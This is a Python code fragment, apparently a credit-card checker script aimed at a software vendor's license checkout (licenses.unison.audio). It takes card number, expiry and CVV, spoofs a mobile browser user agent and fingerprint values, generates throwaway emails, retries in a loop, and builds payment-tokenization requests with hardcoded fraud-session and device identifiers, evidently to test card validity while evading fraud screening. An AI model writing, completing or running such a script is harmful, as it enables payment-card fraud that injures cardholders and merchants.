...
_UA = ('Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 '
...
def _flow(num, mes, ano, cvv):
    ...
    for _ in range(3):
        try:
            ...
            ml      = _email()
            hdrs    = {
                'Host': 'licenses.unison.audio', 'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
                'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
                'Upgrade-Insecure-Requests': '1', 'User-Agent': _UA,
            ...
            if not t1 or not t2:
                last = 'tokens not found'; continue

            hdrs['Content-Type'] = 'application/json'
            for step in [
                {'token': t1, 'email': ml, 'firstName': '',   'lastName': '', 'listId': '350'},
                {'token': t1, 'email': ml, 'firstName': fn,   'lastName': '', 'listId': '350'},
                {'token': t1, 'email': ml, 'firstName': fn,   'lastName': ln, 'listId': '350'},
            ]:
                sess.post(_UT, headers=hdrs, json=step, timeout=15)

            hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
            data = (f'first_name={fn}&last_name={ln}&token=&number={num}'
                    f'&fraud[0][processor]=fraudnet&fraud[0][session_id]=8139ab05f7bd8ebf7285cf48e99f927d'
                    f'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-MX'
                    f'&browser[referrer_url]={_URL}'
                    f'&browser[screen_height]=712&browser[screen_width]=320'
                    f'&browser[time_zone_offset]=360'
                    f'&browser[user_agent]={_UA}'
                    f'&month={mes}&year={ano}&cvv={cvv}&version=4.44.0'
                    f'&key=ewr1-lNVirUwU36fbpe0qV9MpKO'
                    f'&deviceId=bCzAa580PO8cLUCl&sessionId=ncSY33KYbhDxlQwh&instanceId=XcyF1IL8d7lsw2FZ')
